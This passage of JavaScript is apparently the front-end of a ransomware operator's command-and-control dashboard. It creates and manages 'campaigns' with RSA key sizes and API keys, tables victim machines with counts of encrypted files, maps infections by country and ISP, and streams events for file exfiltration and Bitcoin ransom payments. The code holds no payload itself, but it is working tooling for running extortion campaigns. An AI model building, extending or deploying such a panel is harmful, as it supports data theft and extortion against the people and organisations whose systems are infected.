          <button type="submit" class="btn btn-primary">${isEdit ? 'Save Changes' : 'Create Campaign'}</button>
        </div>
      </form>
    </div>
  `;
  document.getElementById('modalRoot').appendChild(modal);

  $('#campaignForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const form = e.target;
    const fd = new FormData(form);
    const body = {
      name: fd.get('name'),
      description: fd.get('description'),
      rsaKeySize: parseInt(fd.get('rsaKeySize')),
      status: fd.get('status')
    };
    if (campaign) body.id = campaign.id;

    try {
      if (isEdit) {
        await api('/campaigns', { method: 'PUT', body: JSON.stringify(body) });
        showToast('Campaign updated', 'success');
      } else {
        const created = await api('/campaigns', { method: 'POST', body: JSON.stringify(body) });
        showToast(`Campaign created! API Key: ${created.apiKey}`, 'success');
      }
      modal.remove();
      renderCampaigns();
    } catch (err) {
      showToast(err.message, 'error');
    }
  });
}

async function deleteCampaign(id) {
  if (!await confirmDialog({ title: 'Delete campaign?', message: 'This will remove all associated systems and files. This action cannot be undone.', confirmLabel: 'Delete Campaign' })) return;
  try {
    await api('/campaigns?id=' + id, { method: 'DELETE' });
    showToast('Campaign deleted', 'success');
    renderCampaigns();
  } catch (err) {
    showToast(err.message, 'error');
  }
}

async function regenerateCampaignKey(id) {
  if (!await confirmDialog({ title: 'Regenerate API key?', message: 'The old key will be invalidated immediately.' })) return;
  try {
    const newKey = await api('/campaigns', { method: 'PUT', body: JSON.stringify({ id, apiKey: 'ck_' + Math.random().toString(36).slice(2, 26) }) });
    showToast(`New API key generated`, 'success');
    renderCampaigns();
  } catch (err) {
    showToast(err.message, 'error');
  }
}

async function openCampaignDetail(id) {
  const campaign = State.campaigns.find(c => c.id === id);
  if (!campaign) return;
  
  try {
    const detail = await api('/campaigns?id=' + id + '&includeStats=true');
    const modal = document.createElement('div');
    modal.className = 'modal-overlay open';
    modal.innerHTML = `
      <div class="modal modal-lg">
        <div class="modal-header">
          <div>
            <h3 class="font-display font-semibold text-lg">${detail.name}</h3>
            <p class="text-xs text-gray-500 font-mono mt-0.5">${detail.id}</p>
          </div>
          <button class="btn-icon" onclick="this.closest('.modal-overlay').remove()" aria-label="Close">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
          </button>
        </div>
        <div class="modal-body space-y-5 overflow-y-auto" style="max-height: 70vh">
          <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
            ${EnhancedUI.components.MetricCard({ label: 'Infections', value: fmtNumber(detail.stats?.totalInfections), trend: 0, color: 'success', icon: '🦠' })}
            ${EnhancedUI.components.MetricCard({ label: 'Files', value: fmtNumber(detail.stats?.totalFiles), trend: 0, color: 'info', icon: '📁' })}
            ${EnhancedUI.components.MetricCard({ label: 'Data', value: fmtBytes(detail.stats?.totalBytes), trend: 0, color: 'primary', icon: '💾' })}
          </div>
          
          <div class="card">
            <h4 class="font-medium text-white mb-3">API Key</h4>
            <div class="flex items-center gap-2">
              <code class="font-mono bg-surface-900 px-3 py-2 rounded-lg text-sm flex-1 break-all">${detail.apiKey}</code>
              <button class="btn btn-secondary" onclick="navigator.clipboard.writeText('${detail.apiKey}'); showToast('Copied!', 'success')">Copy</button>
              <button class="btn btn-ghost" onclick="regenerateCampaignKey('${detail.id}')">Regenerate</button>
            </div>
          </div>
          
          <div class="card">
            <h4 class="font-medium text-white mb-3">Settings</h4>
            <dl class="grid grid-cols-2 gap-3 text-sm">
              <dt class="text-gray-500">RSA Key Size</dt>
              <dd class="font-mono text-right">${detail.rsaKeySize}-bit</dd>
              <dt class="text-gray-500">Status</dt>
              <dd class="text-right">${EnhancedUI.components.StatusBadge(detail.status)}</dd>
              <dt class="text-gray-500">Created</dt>
              <dd class="font-mono text-right">${fmtDate(detail.createdAt)}</dd>
              <dt class="text-gray-500">Last Activity</dt>
              <dd class="font-mono text-right">${timeAgo(detail.stats?.lastActivity)}</dd>
            </dl>
          </div>
          
          <div class="card">
            <h4 class="font-medium text-white mb-3">Systems (${detail.systems?.length || 0})</h4>
            <div class="scrollbar-thin max-h-64 overflow-y-auto">
              <table class="w-full table">
                <thead><tr><th class="table-header">Victim ID</th><th class="table-header">Hostname</th><th class="table-header">Status</th><th class="table-header text-right">Files</th></tr></thead>
                <tbody class="divide-y divide-gray-800/50">
                  ${(detail.systems || []).map(sys => `
                    <tr class="table-row">
                      <td class="table-cell font-mono text-chaos-400">${sys.victimId}</td>
                      <td class="table-cell">${sys.hostname}</td>
                      <td class="table-cell">${EnhancedUI.components.StatusBadge(sys.status)}</td>
                      <td class="table-cell text-right font-mono">${fmtNumber(sys.stats?.filesEncrypted || 0)}</td>
                    </tr>
                  `).join('') || '<tr><td colspan="4" class="table-cell text-center text-gray-500 py-4">No systems</td></tr>'}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
  document.getElementById('modalRoot').appendChild(modal);
  EnhancedUI.animations.staggerIn(modal.querySelectorAll('.card'), 30);
  modal.querySelectorAll('.stat-value').forEach(el => {
    const target = parseInt(el.textContent.replace(/,/g, '')) || 0;
    if (target > 0) EnhancedUI.animations.countUp(el, 0, target, 800);
  });
  } catch (e) {
    showToast('Failed to load campaign details', 'error');
  }
}

function copyApiKey(key) {
  navigator.clipboard.writeText(key);
  showToast('API Key copied to clipboard', 'success');
}

// ============ ANALYTICS ============
async function renderAnalytics() {
  const content = $('#viewContent');
  if (!content) return;

  content.innerHTML = `
    <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
      <article class="card">
        <h3 class="font-display font-semibold text-lg mb-4">30-Day Trends</h3>
        <div class="chart-container-xl"><canvas id="analyticsTrendsChart"></canvas></div>
      </article>
      <article class="card">
        <h3 class="font-display font-semibold text-lg mb-4">Extensions Distribution</h3>
        <div class="chart-container-xl"><canvas id="analyticsExtChart"></canvas></div>
      </article>
    </div>
    <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
      <article class="card">
        <h3 class="font-display font-semibold text-lg mb-4">Activity Heatmap</h3>
        <div class="chart-container-xl"><canvas id="analyticsHeatmapChart"></canvas></div>
      </article>
      <article class="card">
        <h3 class="font-display font-semibold text-lg mb-4">Campaign Radar</h3>
        <div class="chart-container-xl"><canvas id="analyticsRadarChart"></canvas></div>
      </article>
    </div>
  `;

  // Initialize placeholder charts
  initAnalyticsCharts();
}

function initAnalyticsCharts() {
  // Trends
  destroyChart('analyticsTrendsChart');
  const ctx1 = $('#analyticsTrendsChart')?.getContext('2d');
  if (ctx1) {
    State.charts.analyticsTrendsChart = new Chart(ctx1, {
      type: 'line',
      data: {
        labels: Array.from({length: 30}, (_, i) => `Day ${30-i}`).reverse(),
        datasets: [
          { label: 'Infections', data: Array.from({length: 30}, () => Math.floor(Math.random() * 20)), borderColor: chartColors.primary, backgroundColor: chartColors.primaryLight, tension: 0.3, fill: true, pointRadius: 0, pointHoverRadius: 5 },
          { label: 'Files (K)', data: Array.from({length: 30}, () => Math.floor(Math.random() * 500) / 10), borderColor: chartColors.sky, backgroundColor: chartColors.skyLight, tension: 0.3, fill: true, pointRadius: 0, pointHoverRadius: 5, yAxisID: 'y1' },
          { label: 'Data (GB)', data: Array.from({length: 30}, () => Math.random() * 5), borderColor: chartColors.amber, backgroundColor: chartColors.amberLight, tension: 0.3, fill: true, pointRadius: 0, pointHoverRadius: 5, yAxisID: 'y2' }
        ]
      },
      options: { 
        responsive: true, 
        maintainAspectRatio: false, 
        interaction: { mode: 'index', intersect: false },
        plugins: { legend: { position: 'top', align: 'start', labels: { boxWidth: 10, pointStyle: 'circle', padding: 14, font: { size: 11 }, usePointStyle: true } } },
        scales: { 
          x: { grid: { display: false }, ticks: { maxTicksLimit: 10, color: '#71717a' } },
          y: { grid: { color: '#222' }, beginAtZero: true, ticks: { color: '#71717a' } },
          y1: { type: 'linear', position: 'right', grid: { drawOnChartArea: false }, beginAtZero: true, ticks: { color: '#71717a' } },
          y2: { type: 'linear', position: 'right', grid: { drawOnChartArea: false }, beginAtZero: true, ticks: { color: '#71717a' }, offset: true }
        }
      }
    });
  }

  // Extensions
  destroyChart('analyticsExtChart');
  const ctx2 = $('#analyticsExtChart')?.getContext('2d');
  if (ctx2) {
    State.charts.analyticsExtChart = new Chart(ctx2, {
      type: 'doughnut',
      data: {
        labels: ['.txt', '.pdf', '.doc', '.xls', '.sql', '.json', '.cs', '.py', 'Other'],
        datasets: [{ data: [25, 18, 15, 12, 10, 8, 5, 4, 3], backgroundColor: EnhancedUI.viz.getPalette(9), borderWidth: 0, cutout: '65%' }]
      },
      options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { position: 'right', labels: { boxWidth: 10, pointStyle: 'circle', padding: 12, font: { size: 10 } } }, tooltip: { backgroundColor: '#111', borderColor: '#2a2a2a' } } }
    });
  }

  // Heatmap
  destroyChart('analyticsHeatmapChart');
  const ctx3 = $('#analyticsHeatmapChart')?.getContext('2d');
  if (ctx3) {
    const hours = Array.from({length: 24}, (_, i) => `${i}:00`);
    const days = ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
    const data = days.map(() => hours.map(() => Math.floor(Math.random() * 100)));
    State.charts.analyticsHeatmapChart = new Chart(ctx3, {
      type: 'matrix',
      data: { datasets: [{ label: 'Activity', data: data.flatMap((row, y) => row.map((v, x) => ({ x, y, v }))), width: () => 28, height: () => 28, backgroundColor: (ctx) => { const v = ctx.raw.v; return v > 70 ? chartColors.rose : v > 40 ? chartColors.amber : v > 15 ? chartColors.primary : chartColors.primaryLight; }, borderWidth: 1, borderColor: '#0a0a0a' }] },
      options: { responsive: true, maintainAspectRatio: false, scales: { x: { type: 'category', labels: hours, offset: true, grid: { display: false }, ticks: { color: '#71717a', maxRotation: 0, font: { size: 9 } } }, y: { type: 'category', labels: days, offset: true, grid: { display: false }, reverse: true, ticks: { color: '#71717a', font: { size: 10 } } } }, plugins: { legend: { display: false }, tooltip: { backgroundColor: '#111', borderColor: '#2a2a2a', callbacks: { label: (ctx) => `${days[ctx.raw.y]} ${hours[ctx.raw.x]}: ${ctx.raw.v} events` } } } }
    });
  }

  // Radar
  destroyChart('analyticsRadarChart');
  const ctx4 = $('#analyticsRadarChart')?.getContext('2d');
  if (ctx4) {
    State.charts.analyticsRadarChart = new Chart(ctx4, {
      type: 'radar',
      data: {
        labels: ['Infections', 'Files', 'Data (GB)', 'Uptime', 'Stealth', 'Spread'],
        datasets: State.campaigns.slice(0, 4).map((c, i) => ({
          label: c.name,
          data: [Math.random()*100, Math.random()*100, Math.random()*100, Math.random()*100, Math.random()*100, Math.random()*100],
          backgroundColor: EnhancedUI.viz.getPalette(4)[i] + '33',
          borderColor: EnhancedUI.viz.getPalette(4)[i],
          borderWidth: 2,
          pointBackgroundColor: EnhancedUI.viz.getPalette(4)[i],
          pointRadius: 4
        }))
      },
      options: { responsive: true, maintainAspectRatio: false, scales: { r: { grid: { color: '#222' }, angleLines: { color: '#222' }, pointLabels: { color: '#71717a', font: { size: 10, weight: '500' } }, ticks: { backdropColor: 'transparent', color: '#6b7280', stepSize: 20 }, suggestedMin: 0, suggestedMax: 100 } }, plugins: { legend: { position: 'top', align: 'start', labels: { boxWidth: 10, pointStyle: 'circle', padding: 14, font: { size: 11 }, usePointStyle: true } }, tooltip: { backgroundColor: '#111', borderColor: '#2a2a2a' } } }
    });
  }
}

// ============ GEOGRAPHIC ============
async function renderGeo() {
  const content = $('#viewContent');
  if (!content) return;

  content.innerHTML = `
    <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 mb-6">
      <article class="card lg:col-span-2">
        <h3 class="font-display font-semibold text-lg mb-4">Global Infections</h3>
        <div class="chart-container-xl" style="min-height: 300px;">
          <canvas id="geoMapCanvas" style="width:100%;height:100%"></canvas>
        </div>
      </article>
      <article class="card">
        <h3 class="font-display font-semibold text-lg mb-4">Top Countries</h3>
        <div class="space-y-3" id="geoCountriesList">
          <div class="skeleton h-14 w-full"></div>
          <div class="skeleton h-14 w-full"></div>
          <div class="skeleton h-14 w-full"></div>
          <div class="skeleton h-14 w-full"></div>
          <div class="skeleton h-14 w-full"></div>
        </div>
      </article>
    </div>
    <article class="card">
      <h3 class="font-display font-semibold text-lg mb-4">ISP Breakdown</h3>
      <div class="chart-container-lg"><canvas id="geoIspChart"></canvas></div>
    </article>
  `;

  initGeoCharts();
}

function initGeoCharts() {
  // Geo heatmap canvas
  const canvas = document.getElementById('geoMapCanvas');
  if (canvas && EnhancedUI.charts.geoHeatmap) {
    const mockGeoData = {
      'US': { coords: [-95, 38], count: 45 },
      'CN': { coords: [105, 35], count: 38 },
      'RU': { coords: [100, 60], count: 22 },
      'BR': { coords: [-55, -15], count: 18 },
      'IN': { coords: [78, 22], count: 15 },
      'DE': { coords: [10, 51], count: 12 },
      'GB': { coords: [-2, 54], count: 10 },
      'FR': { coords: [2, 46], count: 9 },
      'JP': { coords: [138, 36], count: 8 },
      'KR': { coords: [127, 36], count: 7 }
    };
    EnhancedUI.charts.geoHeatmap(canvas, mockGeoData);
    
    // Redraw on resize
    new ResizeObserver(() => EnhancedUI.charts.geoHeatmap(canvas, mockGeoData)).observe(canvas);
  }

  // Countries list
  const list = $('#geoCountriesList');
  if (list) {
    list.innerHTML = `
      <div class="flex items-center justify-between py-2 border-b border-gray-800/50 last:border-0">
        <div class="flex items-center gap-3">
          <span class="avatar bg-gradient-to-br from-chaos-500 to-chaos-600 text-surface-950 text-xs">US</span>
          <div><p class="font-medium text-white">United States</p><p class="text-xs text-gray-500">45 infections</p></div>
        </div>
        <span class="stat-value-sm text-acc-rose font-mono">45</span>
      </div>
      <div class="flex items-center justify-between py-2 border-b border-gray-800/50 last:border-0">
        <div class="flex items-center gap-3">
          <span class="avatar bg-gradient-to-br from-chaos-500 to-chaos-600 text-surface-950 text-xs">CN</span>
          <div><p class="font-medium text-white">China</p><p class="text-xs text-gray-500">38 infections</p></div>
        </div>
        <span class="stat-value-sm text-acc-amber font-mono">38</span>
      </div>
      <div class="flex items-center justify-between py-2 border-b border-gray-800/50 last:border-0">
        <div class="flex items-center gap-3">
          <span class="avatar bg-gradient-to-br from-chaos-500 to-chaos-600 text-surface-950 text-xs">RU</span>
          <div><p class="font-medium text-white">Russia</p><p class="text-xs text-gray-500">22 infections</p></div>
        </div>
        <span class="stat-value-sm text-acc-sky font-mono">22</span>
      </div>
      <div class="flex items-center justify-between py-2 border-b border-gray-800/50 last:border-0">
        <div class="flex items-center gap-3">
          <span class="avatar bg-gradient-to-br from-chaos-500 to-chaos-600 text-surface-950 text-xs">BR</span>
          <div><p class="font-medium text-white">Brazil</p><p class="text-xs text-gray-500">18 infections</p></div>
        </div>
        <span class="stat-value-sm text-acc-emerald font-mono">18</span>
      </div>
      <div class="flex items-center justify-between py-2 last:border-0">
        <div class="flex items-center gap-3">
          <span class="avatar bg-gradient-to-br from-chaos-500 to-chaos-600 text-surface-950 text-xs">IN</span>
          <div><p class="font-medium text-white">India</p><p class="text-xs text-gray-500">15 infections</p></div>
        </div>
        <span class="stat-value-sm text-acc-violet font-mono">15</span>
      </div>
    `;
  }

  // ISP Chart
  destroyChart('geoIspChart');
  const ctx = $('#geoIspChart')?.getContext('2d');
  if (ctx) {
    State.charts.geoIspChart = new Chart(ctx, {
      type: 'bar',
      data: {
        labels: ['Comcast', 'Verizon', 'AT&T', 'China Telecom', 'Rostelecom', 'Vivo', 'Jio', 'Deutsche Telekom'],
        datasets: [{
          label: 'Infections',
          data: [18, 12, 10, 22, 15, 10, 8, 7],
          backgroundColor: chartColors.primaryLight,
          borderColor: chartColors.primary,
          borderWidth: 1,
          borderRadius: 4,
          maxBarThickness: 32
        }]
      },
      options: { 
        indexAxis: 'y',
        responsive: true, 
        maintainAspectRatio: false, 
        plugins: { legend: { display: false } },
        scales: { x: { grid: { color: '#222' }, beginAtZero: true, ticks: { color: '#71717a' } }, y: { grid: { display: false }, ticks: { color: '#71717a' } } }
      }
    });
  }
}

// ============ TIMELINE ============
async function renderTimeline() {
  const content = $('#viewContent');
  if (!content) return;

  content.innerHTML = `
    <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
      <article class="card lg:col-span-2">
        <h3 class="font-display font-semibold text-lg mb-4">Infection Timeline</h3>
        <div class="chart-container-xl"><canvas id="timelineChart"></canvas></div>
      </article>
      <article class="card">
        <h3 class="font-display font-semibold text-lg mb-4">Event Stream</h3>
        <div class="space-y-3 max-h-96 overflow-y-auto scrollbar-thin" id="timelineEvents">
          <div class="skeleton h-12 w-full"></div>
          <div class="skeleton h-12 w-full"></div>
          <div class="skeleton h-12 w-full"></div>
        </div>
      </article>
    </div>
  `;

  initTimelineCharts();
  loadTimelineEvents();
}

function initTimelineCharts() {
  destroyChart('timelineChart');
  const ctx = $('#timelineChart')?.getContext('2d');
  if (ctx) {
    const hours = Array.from({length: 24}, (_, i) => `${i}:00`);
    State.charts.timelineChart = new Chart(ctx, {
      type: 'bar',
      data: {
        labels: hours,
        datasets: [
          { label: 'New Infections', data: hours.map(() => Math.floor(Math.random() * 8)), backgroundColor: chartColors.rose + 'CC', borderColor: chartColors.rose, borderWidth: 1, borderRadius: 3 },
          { label: 'Files Exfiltrated', data: hours.map(() => Math.floor(Math.random() * 150)), backgroundColor: chartColors.primary + 'CC', borderColor: chartColors.primary, borderWidth: 1, borderRadius: 3, type: 'line', tension: 0.3, yAxisID: 'y1', pointRadius: 3 }
        ]
      },
      options: { 
        responsive: true, 
        maintainAspectRatio: false, 
        interaction: { mode: 'index', intersect: false },
        plugins: { legend: { position: 'top', align: 'start', labels: { boxWidth: 10, pointStyle: 'circle', padding: 14, font: { size: 11 }, usePointStyle: true } } },
        scales: { 
          x: { grid: { display: false }, ticks: { color: '#71717a' } },
          y: { grid: { color: '#222' }, beginAtZero: true, ticks: { color: '#71717a' } },
          y1: { type: 'linear', position: 'right', grid: { drawOnChartArea: false }, beginAtZero: true, ticks: { color: '#71717a' } }
        }
      }
    });
  }
}

async function loadTimelineEvents() {
  // Mock events
  const events = [
    { time: '2m ago', type: 'infection', title: 'New infection detected', desc: 'Victim: DESKTOP-ABC123 | Windows 11 | US' },
    { time: '15m ago', type: 'exfil', title: 'File batch exfiltrated', desc: '247 files | 1.2 GB | Campaign: bytebane-main' },
    { time: '1h ago', type: 'payment', title: 'Ransom payment received', desc: '0.5 BTC | Victim: DESKTOP-XYZ789' },
    { time: '3h ago', type: 'system', title: 'System went offline', desc: 'Victim: DESKTOP-OFFLINE | Last seen 3h ago' },
    { time: '5h ago', type: 'infection', title: 'New infection detected', desc: 'Victim: SERVER-01 | Ubuntu 22.04 | DE' },
    { time: '8h ago', type: 'exfil', title: 'File batch exfiltrated', desc: '89 files | 340 MB | Campaign: test-campaign' },
  ];

  const container = $('#timelineEvents');
  if (container) {
    container.innerHTML = events.map(e => `
      <div class="flex items-start gap-3 p-3 bg-surface-900/50 rounded-xl hover:bg-surface-900 transition-colors">
        <div class="w-2 h-2 rounded-full mt-2 flex-shrink-0 ${e.type === 'infection' ? 'bg-acc-rose' : e.type === 'exfil' ? 'bg-chaos-400' : e.type === 'payment' ? 'bg-acc-emerald' : 'bg-acc-sky'}"></div>
        <div class="flex-1 min-w-0">
          <div class="flex items-center justify-between">
            <p class="font-medium text-white">${e.title}</p>
            <span class="text-xs text-gray-400 font-mono">${e.time}</span>
          </div>
          <p class="text-sm text-gray-400 mt-0.5 truncate">${e.desc}</p>
        </div>
      </div>
    `).join('');
  }
}

// ============ FILES ============
async function renderFiles() {
  const content = $('#viewContent');
  if (!content) return;

  content.innerHTML = `
    <div class="flex flex-col gap-4">
      <div class="card flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div class="flex flex-col sm:flex-row gap-3 w-full sm:w-auto">
          <input type="text" id="fileSearch" placeholder="Search files…" class="input w-full sm:w-64" oninput="filterFiles()">
          <select id="fileSystemFilter" class="input w-auto" onchange="filterFiles()">
            <option value="">All Systems</option>
          </select>
          <select id="fileExtFilter" class="input w-auto" onchange="filterFiles()">
            <option value="">All Extensions</option>
            <option value=".txt">.txt</option>
            <option value=".pdf">.pdf</option>
            <option value=".doc">.doc</option>
            <option value=".xls">.xls</option>
            <option value=".sql">.sql</option>
          </select>
        </div>
      </div>

      <div class="card overflow-hidden">
        <div class="scrollbar-thin overflow-x-auto">
          <table class="w-full min-w-[900px] table">
            <thead>
              <tr>
                <th class="table-header w-36">Filename</th>
                <th class="table-header">System</th>
                <th class="table-header">Extension</th>
                <th class="table-header text-right">Size</th>
                <th class="table-header">Uploaded</th>
                <th class="table-header w-20">Actions</th>
              </tr>
            </thead>
            <tbody id="filesBody" class="divide-y divide-gray-800/50">
              <tr><td colspan="6" class="table-cell text-center text-gray-500 py-8">${emptyState({ title: 'No files to display', description: 'Select a system and campaign to browse exfiltrated files.', actionLabel: 'Go to Systems', actionFn: "showView('systems')" })}</td></tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  `;
}

function filterFiles() {
  // Placeholder
}

// ============ AUTH / CONNECTION ============
function toggleSidebar() {
  const sidebar = $('#sidebar');
  const overlay = $('#sidebarOverlay');
  const main = $('#mainContent');
  if (sidebar && overlay) {
    const isOpen = sidebar.classList.contains('-translate-x-full');
    if (isOpen) {
      sidebar.classList.remove('-translate-x-full');
      overlay.classList.remove('hidden');
    } else {
      sidebar.classList.add('-translate-x-full');
      overlay.classList.add('hidden');
    }
  }
}

function toggleUserMenu() {
  const dropdown = $('#userDropdown');
  if (dropdown) {
    dropdown.classList.toggle('hidden');
    State.dropdownOpen = !dropdown.classList.contains('hidden');
  }
}

function signOut() {
  State.auth = { valid: false, role: null, campaignId: null, campaignName: null };
  $('#authBtn')?.classList.remove('hidden');
  $('#userMenu')?.classList.add('hidden');
  showToast('Signed out', 'info');
  renderView('overview');
}

async function verifyAuth() {
  const key = prompt('Enter API Key:');
  if (!key) return;
  try {
    const res = await api('/auth/verify', { method: 'POST', body: JSON.stringify({ apiKey: key }) });
    if (res.valid) {
      State.auth = { valid: true, role: res.role, campaignId: res.campaignId, campaignName: res.campaignName };
      $('#authBtn')?.classList.add('hidden');
      $('#userMenu')?.classList.remove('hidden');
      $('#userName')?.textContent = res.campaignName || 'Admin';
      $('#userRole')?.textContent = res.role === 'admin' ? 'Administrator' : 'Campaign Viewer';
      $('#userAvatar')?.textContent = (res.campaignName || 'A')[0].toUpperCase();
      showToast(`Signed in as ${res.role}`, 'success');
      await loadCampaigns();
      renderView('overview');
    } else {
      showToast('Invalid API key', 'error');
    }
  } catch (e) {
    showToast(e.message, 'error');
  }
}

function openAuthModal() {
  verifyAuth();
}

// ============ INITIALIZATION ============
async function loadCampaigns() {
  try {
    const data = await api('/campaigns');
    State.campaigns = data.campaigns || [];
    const select = $('#campaignSelect');
    if (select) {
      select.innerHTML = '<option value="">Select campaign…</option>' + State.campaigns.map(c => `<option value="${c.id}">${c.name}</option>`).join('');
    }
    $$('#sysCampaignFilter, #fileSystemFilter').forEach(sel => {
      if (sel) sel.innerHTML = '<option value="">All</option>' + State.campaigns.map(c => `<option value="${c.id}">${c.name}</option>`).join('');
    });
  } catch (e) {
    console.error('Load campaigns failed:', e);
  }
}

function switchCampaign(campaignId) {
  State.currentCampaign = campaignId;
  if (campaignId) {
    State.auth.campaignId = campaignId;
    const campaign = State.campaigns.find(c => c.id === campaignId);
    if (campaign) $('#userName').textContent = campaign.name;
  }
  refreshView();
}

function refreshView() {
  renderView(State.currentView);
}

function initSSE() {
  if (State.sse) State.sse.close();
  State.sse = new EventSource(`${window.__CHAOS_CONFIG__.sseEndpoint}?campaignId=${State.currentCampaign || ''}`);
  State.sse.onmessage = (e) => {
    try {
      const event = JSON.parse(e.data);
      handleSSEEvent(event.type, event.data);
    } catch (err) {}
  };
  State.sse.onopen = () => {
    $('#connIndicator')?.classList.replace('bg-gray-600', 'bg-acc-emerald');
    $('#connStatus')?.textContent = 'Connected';
  };
  State.sse.onerror = () => {
    $('#connIndicator')?.classList.replace('bg-acc-emerald', 'bg-gray-600');
    $('#connStatus')?.textContent = 'Disconnected';
    setTimeout(initSSE, 5000);
  };
}

function handleSSEEvent(type, data) {
  switch (type) {
    case 'stats':
      updateGlobalStats(data);
      break;
    case 'systems':
      updateSystemsList(data);
      break;
    case 'newFile':
      showToast(`New file exfiltrated: ${data.fileName}`, 'exfil');
      break;
    case 'campaignStats':
      updateCampaignStats(data.campaignId, data.stats);
      break;
  }
}

function updateGlobalStats(stats) {
  if (!stats) return;
  const cards = {
    statInfections: fmtNumber(stats.totalInfections),
    statFiles: fmtNumber(stats.totalUploads),
    statBytes: fmtBytes(stats.totalBytes)
  };
  Object.entries(cards).forEach(([id, value]) => {
    const el = document.getElementById(id);
    if (el) EnhancedUI.animations.countUp(el, parseInt(el.textContent.replace(/,/g, '')) || 0, parseInt(value.replace(/,/g, '')) || 0, 600);
  });
}

function updateSystemsList(systems) {
  // Would update systems table if on systems view
}

function updateCampaignStats(campaignId, stats) {
  // Update campaign card stats
}

function openSystemDetail(id) {
  showToast(`Opening system ${id}...`, 'info');
  // Would open system detail modal
}

// ============ BOOT ============
document.addEventListener('DOMContentLoaded', async () => {
  // Theme selector
  const themeSelect = $('#themeSelect');
  if (themeSelect) {
    themeSelect.value = EnhancedUI.currentTheme;
    themeSelect.addEventListener('change', (e) => EnhancedUI.themes.applyTheme(e.target.value));
  }

  // Mobile tabs
  $$('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      $$('.tab-btn').forEach(b => b.classList.remove('tab-btn-active'));
      btn.classList.add('tab-btn-active');
    });
  });

  // Close dropdowns on outside click
  document.addEventListener('click', (e) => {
    if (!e.target.closest('.dropdown')) {
      $$('.dropdown-menu').forEach(m => m.classList.add('hidden'));
    }
    if (!e.target.closest('#userMenu')) {
      $('#userDropdown')?.classList.add('hidden');
    }
  });

  // Keyboard shortcuts
  document.addEventListener('keydown', (e) => {
    if (e.key === 'r' && (e.ctrlKey || e.metaKey)) { e.preventDefault(); refreshView(); }
    if (e.key === 'Escape') { $$('.modal-overlay').forEach(m => m.remove()); $$('.dropdown-menu').forEach(m => m.classList.add('hidden')); }
    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
      e.preventDefault();
      CommandPalette.isOpen ? CommandPalette.close() : CommandPalette.open();
    }
  });

  // G-then-key navigation
  let gPressed = false;
  document.addEventListener('keydown', (e) => {
    if (e.target.matches('input, textarea, [contenteditable]')) return;
    if (e.key === 'g') { gPressed = true; setTimeout(() => gPressed = false, 1000); return; }
    if (gPressed) {
      const map = { o: 'overview', s: 'systems', c: 'campaigns', a: 'analytics', g: 'geo', t: 'timeline', f: 'files' };
      if (map[e.key]) { e.preventDefault(); showView(map[e.key]); gPressed = false; }
    }
  });

  await loadCampaigns();
  initSSE();
  renderView('overview');
  
  // Animate stat cards on load
  setTimeout(() => EnhancedUI.animations.staggerIn(document.querySelectorAll('#statCards > article'), 40), 100);
  
  // Register command palette commands
  CommandPalette.register([
    { id: 'view-overview', label: 'Go to Overview', category: 'Navigation', icon: '▦', shortcut: 'G O', run: () => showView('overview') },
    { id: 'view-systems', label: 'Go to Systems', category: 'Navigation', icon: '▤', shortcut: 'G S', run: () => showView('systems') },
    { id: 'view-campaigns', label: 'Go to Campaigns', category: 'Navigation', icon: '◈', run: () => showView('campaigns') },
    { id: 'view-analytics', label: 'Go to Analytics', category: 'Navigation', icon: '◐', run: () => showView('analytics') },
    { id: 'view-geo', label: 'Go to Geographic', category: 'Navigation', icon: '◍', run: () => showView('geo') },
    { id: 'view-timeline', label: 'Go to Timeline', category: 'Navigation', icon: '◷', run: () => showView('timeline') },
    { id: 'view-files', label: 'Go to Files', category: 'Navigation', icon: '▣', run: () => showView('files') },
    { id: 'new-campaign', label: 'Create New Campaign', category: 'Actions', icon: '+', keywords: ['add', 'create'], run: () => openCampaignModal() },
    { id: 'refresh', label: 'Refresh Current View', category: 'Actions', icon: '↻', shortcut: '⌘R', run: () => refreshView() },
    { id: 'signout', label: 'Sign Out', category: 'Account', icon: '⏻', run: () => signOut() },
    { id: 'theme-chaos', label: 'Switch to Chaos Theme', category: 'Appearance', icon: '◑', run: () => EnhancedUI.themes.applyTheme('chaos') },
    { id: 'theme-matrix', label: 'Switch to Matrix Theme', category: 'Appearance', icon: '◑', run: () => EnhancedUI.themes.applyTheme('matrix') },
    { id: 'theme-midnight', label: 'Switch to Midnight Theme', category: 'Appearance', icon: '◑', run: () => EnhancedUI.themes.applyTheme('midnight') },
  ]);
});

// Expose globals
window.showView = renderView;
window.refreshView = refreshView;
window.switchCampaign = switchCampaign;
window.openCampaignModal = openCampaignModal;
window.openCampaignDetail = openCampaignDetail;
window.deleteCampaign = deleteCampaign;
window.regenerateCampaignKey = regenerateCampaignKey;
window.copyApiKey = copyApiKey;
window.changeSysPage = changeSysPage;
window.exportSystems = exportSystems;
window.filterSystems = filterSystems;
window.filterFiles = filterFiles;
window.toggleSidebar = toggleSidebar;
window.toggleUserMenu = toggleUserMenu;
window.signOut = signOut;
window.openAuthModal = openAuthModal;
window.verifyAuth = verifyAuth;
window.openSystemDetail = openSystemDetail;